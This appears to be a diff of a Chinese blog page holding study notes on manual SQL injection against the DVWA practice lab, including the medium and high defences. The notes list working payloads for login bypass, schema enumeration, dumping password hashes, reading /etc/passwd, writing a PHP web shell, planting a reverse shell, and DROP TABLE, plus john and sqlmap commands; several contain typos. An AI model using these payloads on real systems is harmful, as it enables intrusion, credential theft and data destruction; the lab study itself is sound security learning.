@@ -4,9 +4,9 @@
   <meta charset="utf-8">
   
   
-  <meta name="description" content="###手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器
+  <meta name="description" content="手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器
 
-####用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHER">
+用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=">
   
 
   
@@ -17,22 +17,22 @@
   
   <title>SQL-注入 | 且随疾风前行</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="###手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  ####用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·">
+  <meta name="description" content="手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·  ‘  % （">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL-注入">
 <meta property="og:url" content="http://yoursite.com/2019/03/19/SQL-注入/index.html">
 <meta property="og:site_name" content="且随疾风前行">
-<meta property="og:description" content="###手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  ####用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·">
+<meta property="og:description" content="手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·  ‘  % （">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/19/AuGOAS.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/20/AKngEj.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/20/AKna4I.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/20/AKuJzV.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/20/AKuDiR.png">
-<meta property="og:updated_time" content="2019-03-20T05:31:24.458Z">
+<meta property="og:updated_time" content="2019-03-20T11:18:59.689Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL-注入">
-<meta name="twitter:description" content="###手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  ####用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·">
+<meta name="twitter:description" content="手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器  用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法·  ‘  % （">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/03/19/AuGOAS.png">
   
   
@@ -90,35 +90,33 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjtgrssan0000hwukxp7r0fsr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjth476hj00006wuk7e6r8f7i" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>###手动漏洞挖掘-sql注入<br>服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器</p>
+        <h3 id="手动漏洞挖掘-sql注入"><a href="#手动漏洞挖掘-sql注入" class="headerlink" title="手动漏洞挖掘-sql注入"></a>手动漏洞挖掘-sql注入</h3><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器</p>
 <hr>
-<p>####用户登录判断<br>·SELECT<em>FROM users WHERE user= ‘uname ‘ AND password=’pass’<br>·SELECT</em>FROM users WHERE user=’name’ AND password=’’ OR ‘’=’’<br>·基于报错的检测方法<br>·  ‘  % （）<br>·基于布尔的检测方法<br>1 ‘ and  ‘1 ‘= ‘1       /       1 ‘ and  ‘1<br>1 ‘and ‘1 ‘= ‘2         /        1 ‘and ‘0<br>判断查询字段并搞清楚位置表列数<br> ‘order by 9–                   #按查询列号排序<br>·  select + 时刻字段数=查询字段数<br>· 联合查询（多条查询语句同时执行）<br>·  ‘union select 1.2–<br>· ·union all select database().2–<br>DB用户 ： user（）<br>DB版本 ;   version()<br>‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）<br>全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）<br>当前库： database()<br>·ASCLL转字符：char()                  分隔<br>链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())<br>计算哈希：md5()</p>
+<h4 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a>用户登录判断</h4><p>·SELECT<em>FROM users WHERE user= ‘uname ‘ AND password=’pass’<br>·SELECT</em>FROM users WHERE user=’name’ AND password=’’ OR ‘’=’’<br>·基于报错的检测方法<br>·  ‘  % （）<br>·基于布尔的检测方法<br>1 ‘ and  ‘1 ‘= ‘1       /       1 ‘ and  ‘1<br>1 ‘and ‘1 ‘= ‘2         /        1 ‘and ‘0<br>判断查询字段并搞清楚位置表列数<br> ‘order by 9–                   #按查询列号排序<br>·  select + 时刻字段数=查询字段数<br>· 联合查询（多条查询语句同时执行）<br>·  ‘union select 1.2–<br>· ·union all select database().2–<br>DB用户 ： user（）<br>DB版本 ;   version()<br>‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）<br>全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）<br>当前库： database()<br>·ASCLL转字符：char()                  分隔<br>链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())<br>计算哈希：md5()</p>
 <hr>
-<p>####Mysql 数据结构<br>·information_schema<br>·所有库所有表/统计每库中表的数量<br>union select table_name,table_schema,from information_schema.tables#（查所有表）<br>UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名）</p>
+<h4 id="Mysql-数据结构"><a href="#Mysql-数据结构" class="headerlink" title="Mysql 数据结构"></a>Mysql 数据结构</h4><p>·information_schema<br>·所有库所有表/统计每库中表的数量<br>union select table_name,table_schema,from information_schema.tables#（查所有表）<br>UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名）</p>
 <hr>
-<p>####Dvwa库中的表名<br>·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询)</p>
+<h4 id="Dvwa库中的表名"><a href="#Dvwa库中的表名" class="headerlink" title="Dvwa库中的表名"></a>Dvwa库中的表名</h4><p>·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询)</p>
 <hr>
-<p>####查询user,password 列的内容<br>·union select user,password from dvwa.users#<br>·union select user,password from users#<br>·union select null,CONCAT(user(),0x3a,password) from users#</p>
+<h4 id="查询user-password-列的内容"><a href="#查询user-password-列的内容" class="headerlink" title="查询user,password 列的内容"></a>查询user,password 列的内容</h4><p>·union select user,password from dvwa.users#<br>·union select user,password from users#<br>·union select null,CONCAT(user(),0x3a,password) from users#</p>
 <hr>
-<p>####破解MD5<br>username:passhas——–&gt;hashtest<br>john –format=raw-MD5 hashtest –shou<br>sqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a</p>
+<h4 id="破解MD5"><a href="#破解MD5" class="headerlink" title="破解MD5"></a>破解MD5</h4><p>username:passhas——–&gt;hashtest<br>john –format=raw-MD5 hashtest –shou<br>sqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a</p>
 <hr>
-<p>###读写文件和下载数据库</p>
-<p>####读取文件<br>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
+<h3 id="读写文件和下载数据库"><a href="#读写文件和下载数据库" class="headerlink" title="读写文件和下载数据库"></a>读写文件和下载数据库</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
 <hr>
-<p>####写入文件</p>
-<blockquote>
+<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote>
 <p>‘union select null,”&lt;?php passthtu  $_GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php”<br>可能会出发过滤机制<br>用16进制编码<br>kali实操拷贝一个反弹shell<br>cp /usr/share/webshell/php/ –&gt;reverse-shell.php/b.php<br>vi b.php 把ip改成目标ip 对b.php编码<br>cat b.php | xxd &lt;–(16进制编码) -ps<br>（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\n’<br>复制下编码内容注入到语句中去（0x编码内容）</p>
 </blockquote>
 <pre><code>·Mysql账号
 </code></pre><p>cat php-revers-shell.php|xxd -ps | tr -d ‘\n’(反弹shell)</p>
-<p>####保存下载数据库<br>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
-<p>####一个思路：编写服务器代码<br>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
+<h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a>保存下载数据库</h4><p>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
+<h4 id="一个思路：编写服务器代码"><a href="#一个思路：编写服务器代码" class="headerlink" title="一个思路：编写服务器代码"></a>一个思路：编写服务器代码</h4><p>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
 <blockquote>
 <p>ps 建议在kali装上professional的burp suite</p>
 </blockquote>
@@ -135,12 +133,11 @@
 <blockquote>
 <p>· ‘:updat user set user=’yuanfh’ where user=’admin<br>“;”可以并列多条数据库语句<br>· INSERT INTO users（’user_id’,’first name’,’last_name’,’）user’,’password’,’avatar)VALUES(‘35’,’fh’,’yuan’,’密码’,’OK’);#<br>‘;DROP TABLE users；#<br>xp_cmdshell/ 储存过程<br>·SQLi没有通用的方法，要领就是掌握原理，了解各种数据库特性</p>
 </blockquote>
-<p>#####sql注入-DVWAmedium难度级别和high难度区分<br><img src="https://s2.ax1x.com/2019/03/20/AKngEj.png" alt><img src="https://s2.ax1x.com/2019/03/20/AKna4I.png" alt><br>上面两张图就是medium和low的区别<br>mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQl<br>medium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译</p>
+<h5 id="sql注入-DVWAmedium难度级别和high难度区分"><a href="#sql注入-DVWAmedium难度级别和high难度区分" class="headerlink" title="sql注入-DVWAmedium难度级别和high难度区分"></a>sql注入-DVWAmedium难度级别和high难度区分</h5><p><img src="https://s2.ax1x.com/2019/03/20/AKngEj.png" alt><img src="https://s2.ax1x.com/2019/03/20/AKna4I.png" alt><br>上面两张图就是medium和low的区别<br>mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQl<br>medium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译</p>
 <blockquote>
 <p>“\,’,”,\n,\r,\xla”<br>下面看一下high改动的代码<br><img src="https://s2.ax1x.com/2019/03/20/AKuJzV.png" alt="在添加一行删除\的代码"><br><img src="https://s2.ax1x.com/2019/03/20/AKuDiR.png" alt="检查输入的是否为数字拒绝其他输入"><br>一个数字检查就无法注入select语句了</p>
 </blockquote>
-<p>###sql 盲注</p>
-
+<h3 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h3>
       
     </div><!-- .entry-content -->
 
